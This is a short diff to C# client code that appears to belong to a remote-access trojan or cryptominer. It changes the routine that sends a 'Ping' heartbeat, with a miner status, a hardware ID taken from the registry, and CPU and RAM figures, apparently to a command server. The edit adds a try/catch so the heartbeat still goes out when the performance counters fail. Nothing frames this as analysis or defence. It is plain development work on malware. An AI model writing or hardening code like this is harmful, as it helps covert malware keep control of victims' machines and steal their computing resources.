@@ -256,7 +256,14 @@ namespace Client.Connection
         {
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "Ping";
-            msgpack.ForcePathObject("Message").AsString = $"MINER {SetRegistry.GetValue(Settings.Hwid) ?? "0"}   CPU {(int)IdSender.TheCPUCounter.NextValue()}%   RAM {(int)IdSender.TheMemCounter.NextValue()}%";
+            try
+            {
+                msgpack.ForcePathObject("Message").AsString = $"MINER {SetRegistry.GetValue(Settings.Hwid) ?? "0"}   CPU {(int)IdSender.TheCPUCounter.NextValue()}%   RAM {(int)IdSender.TheMemCounter.NextValue()}%";
+            }
+            catch
+            {
+                msgpack.ForcePathObject("Message").AsString = $"MINER {SetRegistry.GetValue(Settings.Hwid) ?? "0"}";
+            }
             Send(msgpack.Encode2Bytes());
             Ping?.Dispose();
             Interval = 0;
